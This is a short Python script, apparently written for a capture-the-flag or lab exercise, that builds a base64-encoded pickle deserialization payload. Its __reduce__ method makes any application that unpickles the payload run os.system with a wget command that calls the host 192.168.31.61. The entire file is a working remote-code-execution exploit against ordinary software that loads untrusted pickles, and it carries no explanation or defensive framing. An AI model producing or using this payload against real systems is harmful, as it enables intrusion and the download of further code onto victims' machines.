import pickle, os, base64
class P(object):
    def __reduce__(self):
        return (os.system,("wget 192.168.31.61/1",))
print(base64.b64encode(pickle.dumps(P())))
